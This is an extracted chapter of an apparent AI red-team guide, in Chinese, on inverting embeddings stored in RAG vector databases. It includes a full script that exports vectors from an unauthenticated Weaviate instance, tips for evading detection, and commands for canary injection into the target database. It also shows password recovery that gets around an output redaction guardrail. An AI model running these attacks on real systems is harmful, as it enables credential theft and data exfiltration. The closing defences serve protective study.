# 第 6 章：攻击嵌入向量 —— 完整提取

> **蓝队安全研究用途**。内容提取自《AI Red 攻防指南》第 6 章原文（PDF 第 78-97 页），含所有攻击方法、命令及 Python 脚本。

---

## 6.0 核心常识纠正

**向量数据库不是哈希。** 嵌入是被设计来保留语义意义的数学表示——意义被保留的地方，信息就能被恢复。开发者常把向量数据库当"单向函数"配置是危险的误解。

**开发者的常见错误信念**："原始格式里不存在敏感信息"、"即使攻击者拿到嵌入向量也什么都做不了"——这个假设从根本上就是错的。

---

## 6.1 嵌入攻击理论

### 三类攻击目标

| 攻击类别 | 目标 | 输出 | 传统类比 |
|---------|------|------|---------|
| **嵌入逆序**（Embedding Inversion） | 重建原始明文 | 人类可读文本 | 从哈希反推密码（但嵌入不是哈希） |
| **成员推断**（Membership Inference） | 判断特定信息是否存在 | 是/否 | 布尔盲注"该记录是否存在" |
| **属性推断**（Attribute Inference） | 预测文档高层元数据 | 分类/敏感度 | 从文件大小推断文件类型 |

**组合使用**：成员推断不能恢复完整上下文但能确认特定数据存在。与嵌入逆序结合后威力大增——两种技术互补弱点。

### 逆序四类方法

| 类别 | 准备时间 | 需知模型 | 需真实配对 | 训练开销 | 本章工具 |
|------|---------|---------|-----------|---------|---------|
| 零样本 | 无 | 是 | 否 | 无 | ZSInvert, Zero2Text |
| 少样本 | ~2小时 | 可未知 | 1K-3K对 | 中等 | ALGEN |
| 监督式 | 数天 | 是 | 自生成（~50万） | 重 | Vec2Text |
| 代理/迁移 | 中等 | 否 | 否 | 中等（替代模型） | — |

### 嵌入逆序的局限

| 局限 | 影响 | 应对策略 |
|------|------|---------|
| Token 长度 | 工具大多限制 32-64 token；真实 RAG 片段 256-512 | 优先攻击短片段（凭证、配置片段） |
| 高熵 token | 随机密码/API密钥无语义可预测性 | 结合成员推断，字典暴力枚举 |
| 模型识别 | 多数方法需知道目标嵌入模型 | 维度指纹（384=all-MiniLM, 768=BGE, 1536=OpenAI ada） |
| 降维/量化 | PCA、随机投影、量化丢弃信息 | 检查数据库是否存储原始全维度嵌入 |
| 领域不匹配 | 训练数据与目标领域差异导致性能下降 | 使用领域特定模板库或训练数据 |

---

## 6.2 侦察：导出、识别、分诊

### 攻击方法 1：导出 Weaviate 嵌入向量

**前提**：已突破边界获取内网访问，发现本地 8080 端口的 Weaviate 无认证。

**Step 1：列出所有集合**

```python
import requests

WEAVIATE_URL = "http://localhost:8080"
response = requests.get(f"{WEAVIATE_URL}/v1/schema")
response.raise_for_status()
schema = response.json()
collections = [c["class"] for c in schema.get("classes", [])]
print("Collections:", collections)
# → Collections: ['DocChunk']
```

**Step 2：导出全部嵌入向量（分页）**

```python
import requests
import numpy as np
import pandas as pd
from pathlib import Path
from tqdm import tqdm

WEAVIATE_URL = "http://localhost:8080/v1/graphql"
COLLECTION = "DocChunk"
PAGE_SIZE = 200
OUT_DIR = Path("./export")
OUT_DIR.mkdir(exist_ok=True)

def gql(query: str):
    resp = requests.post(WEAVIATE_URL, json={"query": query})
    resp.raise_for_status()
    data = resp.json()
    if "errors" in data:
        raise RuntimeError(data["errors"])
    return data["data"]

# 先查总数
count_query = """{ Aggregate { DocChunk { meta { count } } } }"""
count_res = gql(count_query)
total = count_res["Aggregate"]["DocChunk"][0]["meta"]["count"]
print(f"Total objects: {total}")

all_ids, all_chunk_ids, all_vectors = [], [], []
cursor = None
fetched = 0
pbar = tqdm(total=total, desc="Exporting embeddings")

while True:
    after_clause = f'after:"{cursor}"' if cursor else ""
    query = f"""{{ Get {{ {COLLECTION}(limit: {PAGE_SIZE} {after_clause}) {{
        chunk_id _additional {{ id vector }}
    }} }} }}"""
    res = gql(query)
    objs = res["Get"][COLLECTION]
    if not objs:
        break
    for obj in objs:
        all_ids.append(obj["_additional"]["id"])
        all_chunk_ids.append(obj.get("chunk_id"))
        all_vectors.append(obj["_additional"]["vector"])
    cursor = objs[-1]["_additional"]["id"]
    fetched += len(objs)
    pbar.update(len(objs))
    if fetched >= total:
        break

pbar.close()

# 保存
vectors_np = np.array(all_vectors, dtype=np.float32)
np.save(OUT_DIR / "embeddings.npy", vectors_np)
np.save(OUT_DIR / "chunk_ids.npy", np.array(all_chunk_ids))
np.save(OUT_DIR / "uuids.npy", np.array(all_ids, dtype=object))

df_meta = pd.DataFrame({"uuid": all_ids, "chunk_id": all_chunk_ids})
df_vec = pd.DataFrame(vectors_np, columns=[f"dim_{i}" for i in range(vectors_np.shape[1])])
df_full = pd.concat([df_meta, df_vec], axis=1)
df_full.to_csv(OUT_DIR / "embeddings.csv", index=False)
df_full.to_parquet(OUT_DIR / "embeddings.parquet", index=False)

print("Vectors successfully exported!")
```

**隐蔽性提示**：一次性导出全部 10,000 个片段可能触发异常检测。采用时间分散策略：分批导出、间隔请求、模拟正常查询模式。

---

### 攻击方法 2：识别嵌入模型

**方法一：维度指纹**

```python
import requests, json

query = """{ Get { DocChunk(limit: 1) { _additional { vector } } } }"""
r = requests.post("http://localhost:8080/v1/graphql", json={"query": query})
vec = r.json()["data"]["Get"]["DocChunk"][0]["_additional"]["vector"]
print("Vector length:", len(vec))
```

**常见模型维度表**：

| 模型 | 维度 |
|------|------|
| all-MiniLM-L6-v2 | 384 |
| BGE-base / BGE-large | 768 |
| text-embedding-3-small / ada-002 | 1536 |
| Cohere embed-english-v3.0 | 1024 |
| text-embedding-3-large | 3072 |

**方法二：推理探测（Inference Probing）**

如果你既有导出向量又能访问 RAG 聊天界面，可以用 `inference_probing.py` 自动化识别：

```bash
python3 inference_probing.py export/embeddings.npy --url http://127.0.0.1:80
```

**原理**：
1. 检查导出维度，自动过滤候选模型列表
2. 发送 24 个探针查询（verbatim 请求、事实性问题、宽泛查询）
3. 对每个候选模型，加载模型 → 嵌入所有提取片段 → 与导出向量计算余弦相似度
4. 正确模型产生的向量接近存储向量（>0.85），错误模型即使对相同文本也只在 0.5-0.6 左右
5. 按 top-5 平均相似度排名，报告识别模型及置信度

**输出示例**：

```
Named model:   sentence-transformers/all-MiniLM-L6-v2
Runner-up:     sentence-transformers/multi-qa-MiniLM-L6-cos-v1
Separation:    0.2090
Confidence:    HIGH
```

---

### 攻击方法 3：片段分诊（Chunk Triage）

**核心问题**：生产向量数据库可能有成千上万片段，对每个片段做完整逆序不现实。分诊解决：在投入资源前，找出最可能包含凭证、API 密钥或其他秘密的片段。

**核心原理**：如果一个片段包含密码重置信息，它的嵌入会与其他关于密码重置的文本相似——即使不知道确切词汇。

**三阶段级联管道**（`chunk_triage_pipe.py`）：

**阶段 1：密度评分**
- 信号 1：k-近邻密度（凭证片段往往"孤独"，语义邻居少）
- 信号 2：对凭证类探针的相关性
- 综合隔离 + 相关性 → top-50 候选

**阶段 2：对比成对（PW）**
- 正探针（类似真实凭证的文本）vs 负探针（类似良性内容）
- 多 alpha RRF 聚合排名
- 自适应负权重、簇归一化
- top-20 候选进入阶段 3

**阶段 3：浅层逆序**
- 种子模式：企业文档模板库匹配
- LLM 模式：推理端点生成候选
- 综合凭证指标评分（正则模式 + 香农熵 + 字符类多样性）
- 用加权 RRF 融合三阶段排名

```bash
python3 chunk_triage_pipe.py export/embeddings.npy
```

**输出示例**：
```
STAGE 1: DENSITY (all 31 chunks -> top 50)
#1 chunk[23] score=0.8023
#2 Chunk[6] score=0.6595
#3 Chunk[11] score=0.6152

FUSION: Weighted RRF (density:1.0, pw:1.5, recon:2.0)
Rank  Chunk  Fused
  1  [ 0]  0.672465
  2  [21]  0.672221
  3  [23]  0.671837
  4  [17]  0.668641       ← 自然 cutoff gap

# 提取 top-3 中的 chunk #23 用于后续攻击
python3 -c "import numpy as np; np.save('chunk_23.npy',
    np.load('export/embeddings.npy')[23:24])"
```

---

## 6.3 零样本嵌入逆序

### 攻击方法 4：模板库 + 成员推断（`emb_fin.py`）

**核心问题**：嵌入逆序与高熵 token（密码、API 密钥、随机字符串）根本性斗争——这些值没有语义可预测性。

**两阶段分离方案**：
1. **阶段一**：恢复语义结构——用模板库匹配句子模式，高熵值替换为 `{PASSWORD}` 等占位符
2. **阶段二**：成员推断填充占位符——遍历词表，将候选值嵌入模板，测量哪个候选产生最高余弦相似度

**模板质量决定准确率**。管道使用大型模板库：对目标嵌入评分数十万个模板，用最佳匹配作为投票面板建立统计置信度。

**Step 1：生成模板库（`generate_templates.py`）**

```bash
python3 generate_templates.py --output templates.json \
  embeddings.npy --count 500000
```

四个扩展策略：
- 模式生成：以不同顺序组合句子片段
- 语言变体：替换同义词、改写从句
- 结构变体：改变整体句子布局
- 上下文包装：添加企业框架语言

从仅 7 个基础模板出发，扩展到数十万结构独特的模板。

**Step 2：下载密码字典**

```bash
wget -O passwords.txt \
  https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt
```

**Step 3：运行 `emb_fin.py`**

```bash
python emb_fin.py embeddings.npy --chunk 0 \
  --templates templates.json \
  --wordlist passwords.txt \
  --slots PASSWORD \
  --default-url https://login.megacorpone.ai \
  --max-templates 500000
```

**四个关键改进**：
1. **自适应模板选择**：用相对阈值（基于最高评分模板相似度）而非固定 top-N
2. **多样性聚类**：贪心过滤近重复模板，确保共识建立在真正独立视角上
3. **两阶段渐进**：先对前几名模板运行完整词表，再把最有希望的候选提升到完整 tournament
4. **边际感知评分**：测量候选相对中性基线的提升，隔离密码槽位贡献

**输出示例**：
```
--- Chunk 0 ---
Best template match (68.7% similarity):
  "The reset password is {PASSWORD} as soon as possible..."
Extracted values:
  PASSWORD = N0=Acc3ss
  Likely -- 18/26 templates agree, narrow statistical margin
```

**验证（原始 PDF 明文）**：
```
IT Security - Password Reset Procedure
Please navigate to https://login.megacorpone.ai and click on
"Need help signing in". The default password after resetting is
N0=Acc3ss which must be changed immediately upon first login.
```

✅ **成功从嵌入中重建了密码！**

**高熵 vs 低熵密码的边界**：
- `AutoEnroll99!` 这样的密码 → 子词携带语义信号，模型能区分性编码 → 成员推断有效
- `1qaz2wsx3edc4rfv` 这样的真正随机字符串 → 切分为无意义子词 → 模型视为噪声 → 99,000 个候选的余弦相似度差异落在噪声 floor(~0.0001)
- 1536-dim 模型稍有改善但仍不可靠 → 核心问题是训练目标（语义相似度），而非向量容量

---

### 攻击方法 5：Zero2Text 束搜索逆序（`zero2text_impl.py`）

**适用场景**：`emb_fin.py` 的模板库无法覆盖目标领域或文本结构时。

**核心算法**：GPT-2 提出合理的下一个 token → 每个候选扩展被嵌入 → 按与目标的余弦相似度评分 → 每步保留最佳候选 → 30-40 步后收敛。

**对论文方法的扩展**：
- **自动高熵检测**：香农分析 + 正则模式识别（API 密钥 "sk-"、JWT "eyJ"、十六进制哈希）
- **动态模板合并**：束搜索创建的动态模板与模板库 top 模板合并，多样性聚类后运行槽位填充
- **双嵌入器模式**（`--local-model`）：本地模型处理候选评分 + 岭回归矩阵映射到受害者模型空间，大幅减少 API 调用成本

```bash
python3 zero2text_impl.py embeddings.npy --chunk 0 \
  --templates templates.json \
  --wordlist passwords.txt \
  --slots PASSWORD \
  --default-url https://login.megacorpone.ai \
  --max-templates 500000
```

**输出示例**：
```
[Zero2Text] Loading gpt2 on CPU...
[Zero2Text done] 8 steps, similarity=0.9160
Inversion: 91.6% similarity
Found 1 high-entropy region(s)
Slot filling...
[Progressive] Locked slots: PASSWORD=N0=Acc3ss
--- Chunk 0 ---
Text inversion (91.6% similarity):
  "kindly visit https://login.megacorpone.ai. Click on Security reset..."
Extracted values:
  PASSWORD = N0=Acc3ss
  Strong -- 4/5 templates agree, 3.1x ahead of runner-up
```

**选择策略**：
1. 先用 `emb_fin.py`（无需训练、无 GPU、分钟级）→ top 模板相似度 >60% 且置信度 Strong/Moderate → 结果可靠
2. 如果 `emb_fin.py` 产生低相似度或弱置信度 → 运行 `zero2text_impl.py` 通过束搜索恢复文本结构

---

## 6.4 预训练嵌入逆序

### 攻击方法 6：ALGEN + 金丝雀嵌入 + 推理探测

**核心思路**：训练小型神经网络一次性从嵌入解码文本。然后结合 RAG 聊天界面进行针对性探测。

**三大改进**（解决原版 ALGEN 的局限）：
1. **金丝雀注入**：把已知"金丝雀"文本插入目标向量数据库，导出目标系统自己产生的嵌入——彻底消除对齐不匹配
2. **Decoder token 上限翻倍**：从 32→64 token，捕获足够语义指纹
3. **推理探测集成**：ALGEN 输出 → 提取关键词 → RAG 针对性查询 → 检索实际文档内容 → 成员推断填充

**环境设置**：

```bash
wget -q https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh -O /tmp/miniconda.sh
bash /tmp/miniconda.sh -b -p ~/miniconda3
~/miniconda3/bin/conda init bash && source ~/.bashrc
conda create -n algen python=3.12 -y
conda activate algen
```

**生成训练数据**（跨 20 个企业领域 50,000 样本）：

```bash
cd ALGEN
pip3 install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu128
pip3 install -r requirements.txt
pip3 install sentence-transformers sacrebleu

python generate_algen_training_data.py \
  --domain it_password,infrastructure_credentials,hr_employee,api_developer,cloud_aws,cloud_azure,network_vpn,ci_cd_devops,email_smtp \
  -o /tmp/canary_source --count 50000 --val-size 500 --test-size 500

python insert_canaries.py --source-dir /tmp/canary_source \
  --weaviate-url http://localhost:8080
```

**训练 decoder**（max_length=64, batch_size=32）：

```bash
sudo systemctl stop vllm
WANDB_MODE=disabled python src/exp.py \
  --model_name google/flan-t5-small \
  --output_dir outputs/flan-t5-small-canary-50k \
  --max_length 64 --data_folder datasets/finetuning_decoder \
  --lang eng_canary --train_samples 49000 --val_samples 500 \
  --batch_size 32 --learning_rate 1e-4 --weight_decay 1e-4 --num_epochs 50
```

**运行攻击**：

```bash
python run_attack.py \
  --canary-embeddings export/canary_embeddings.npy \
  --embeddings export/embeddings.npy \
  --output algen_results.json
```

**推理探测**（`rag_probe_attack.py`）：ALGEN 输出包含语义指纹（域名片段、关键词、短语）→ 作为针对性 RAG 查询 → 检索实际文档内容 → 即使输出护栏编修敏感值，编修本身创造可检测的占位符。

```bash
python rag_probe_attack.py \
  --algen-output algen_results.json \
  --rag-url http://localhost:80 \
  --chunk 0 -o probe_template.json
```

**ALGEN 成员推断**（`algen_membership_inference.py`）：

```bash
python algen_membership_inference.py export/embeddings.npy \
  --probe-output probe_template.json --chunk 0 \
  --slot PASSWORD --wordlist passwords.txt \
  --default-url https://login.megacorpone.ai --top-k 10
```

**输出示例**：

```
BEST CANDIDATE: prose
Reconstruction Similarity: 0.9052
--- Slot: PASSWORD ---
Top candidates:
  [1] N0=Acc3ss  sim=0.9052 margin=+0.0246
  [2] acc123     sim=0.8955 margin=+0.0143
  [3] acc1234    sim=0.8944 margin=+0.0132
Confidence: HIGH (z=10.63, gap=4.22, sep=1.7x)
Assessment: Strong match -- high confidence

--- Summary ---
PASSWORD = N0=Acc3ss [+] HIGH
```

**关键洞察**：输出护栏成功阻止密码出现在任何 RAG 响应中，但密码仍然被恢复——因为 stolen 嵌入编码的是原始未编修文本，所以用正确值填充 `{PASSWORD}` 槽位会产生最高余弦相似度。

**金丝雀清理**：攻击后必须从向量数据库移除金丝雀文档。如果在生产中留下 50,000 个无文档记录的金丝雀，会对统计分析和 RAG 质量产生严重后果。隐蔽性受限评估中，3,000-5,000 个金丝雀提供几乎相同的对齐质量，足迹显著更小。

---

### 攻击方法 7：Vec2Text 监督式神经逆序

**两阶段架构**：
- **Inverter**：从嵌入生成初始文本假设
- **Corrector**：计算目标嵌入与当前假设嵌入的差异，迭代精化输出（20-50 轮修正）

**三方面扩展**（适配单 T4 GPU, 16GB VRAM 的企业 RAG 凭证恢复）：

**改动 1：企业领域训练语料**（替换原版百科训练数据）
- 约 80% 合成企业文本：200+ 模板 × 10 类别（凭证重置、服务账号、基础设施配置、API 密钥、运行手册、入职文档、变更管理、网络安全策略、会议记录、IT 文档）
- 约 20% Wikipedia（通用语言覆盖）
- 模型学会重建含密码、URL、用户名和服务账号详情的文本

**改动 2：Vec2Text 作为侦察工具**（非最终提取）
- Inverter 恢复片段的结构上下文（模板形状、URL、周围自然语言）
- 把实际凭证恢复交给判别式槽位填充器
- Vec2Text 告诉我们嵌入代表什么类型的文档 → 槽位填充器恢复高熵秘密

**改动 3：侦察引导的模板选择**
- Vec2Text 恢复的文本被嵌入并与模板类别比对
- 把模板池从 200+ 缩小到检测领域的 20 个模板

**数据准备**：

```bash
python prepare_data.py --source hybrid --max-samples 500000 --output-dir data
# Hybrid total: 499,999 samples
# Split: train=490,001 val=4,999 test=4,999
```

**训练 inverter**（~50 小时单 T4）：

```bash
python train_inverter.py --data-dir data --output-dir checkpoints/inverter \
  --batch-size 8 --grad-accum 16 --lr 1e-4 --epochs 20 --eval-steps 2000 --no-wandb
# Epoch 20/20: bleu=59.43 rougeL=0.7780 avg_cosine_sim=0.9195
```

**训练 corrector**（~10 小时）：

```bash
python train_corrector.py --data-dir data \
  --inverter-checkpoint checkpoints/inverter/best.pt \
  --output-dir checkpoints/corrector \
  --batch-size 8 --grad-accum 16 --lr 5e-5 --epochs 5 --eval-steps 2000 --no-wandb
# correction_gain=+0.000082
```

**攻击**（每片段 ~15 分钟）：

```bash
python attack.py ../embeddings.npy --wordlist passwords.txt \
  -o attack_results.json -v
```

**输出示例**：

```
ATTACK RESULTS
Chunk 0 (922.1s)
Recon: 93.0% similarity
Template: recon-guided -> credential_reset
+++ PASSWORD = N0=Acc3ss
    Strong -- 5/20 templates agree
++ URL = https://login.megacorpone.ai
    Moderate -- 18/20 templates agree
++ USERNAME = mwilliams
    Moderate -- 15/20 templates agree
```

**渐进式填充-锁定策略**：先恢复 URL 和用户名（高置信度、低熵值）锁定进模板，再用额外上下文重新运行密码槽位 → 密码 z-score 从 5.44 提升到 6.50。

---

## 6.5 方法选择与总结

### 决策路径

| 条件 | 首选工具 | 原因 |
|------|---------|------|
| 模型已知；目标领域常见 | `emb_fin.py` | 无训练、无 GPU、分钟级 |
| `emb_fin.py` 相似度 <60% 或弱置信度 | `zero2text_impl.py` | 束搜索恢复实际结构 |
| 模型未知 | ALGEN + 金丝雀 | 唯一不需知道嵌入模型的方法 |
| 模型已知；多周评估；大量片段 | Vec2Text | 最高重建质量(~93%)，每片段~15分钟 |

### 核心结论

1. **嵌入不是哈希**：开发者把向量数据库当"单向函数"是危险误解
2. **短片段最脆弱**：凭证、配置片段、简短注释（32-64 token）是当前工具甜点区
3. **有意义密码可恢复**：用户名、主机名、URL 携带语义信号可被成员推断恢复。真正随机字符串无法通过语义方法恢复
4. **输出护栏不保护嵌入**：即使 RAG 回答中对密码做了 `[REDACTED]` 编修，stolen 嵌入本身编码的是原始未编修文本
5. **组合是关键**：先分诊缩小目标 → 合适的方法逆序 → 成员推断填充高熵槽位

### 防御最小集

1. **不要认为向量数据库是安全存储**：嵌入可逆，向量形式和文本形式同样需要保护
2. **量化与降维**：乘积量化（PQ）或标量量化（SQ）会丢弃逆序需要的信息（但需权衡搜索精度）
3. **访问控制**：向量数据库应像生产数据库一样配置认证、审计和网络隔离
4. **模型选择意识**：高维模型（1536/3072）比 384-dim 保留更多可逆序信息
5. **监控异常查询**：大量相似度探针查询（如成员推断需要的数千次嵌入请求）可能暴露攻击

---

## 蓝队自测清单

| 检查项 | 风险 | 对应方法 | 验证 |
|--------|------|---------|------|
| Weaviate 是否配置认证 | 高 | 方法 1 | 尝试无认证访问 |
| 是否可导出全部嵌入向量 | 高 | 方法 1 | GraphQL 导出测试 |
| 通过维度可否推断嵌入模型 | 高 | 方法 2 | 检查向量维度 |
| 推理探针可否识别嵌入模型 | 中 | 方法 2 | `inference_probing.py` |
| 分诊管道可否识别高价值片段 | 高 | 方法 3 | `chunk_triage_pipe.py` |
| 模板库+成员推断可否恢复凭证 | 高 | 方法 4 | `emb_fin.py` 测试 |
| 束搜索逆序可否恢复文本结构 | 高 | 方法 5 | `zero2text_impl.py` 测试 |
| 是否可注入金丝雀文档 | 高 | 方法 6 | ALGEN 测试 |
| 是否使用量化/降维保护嵌入 | 低 | 防御 | 检查 Weaviate 配置 |
| 嵌入模型是否为高维模型 | 中 | 防御 | 检查使用的模型 |
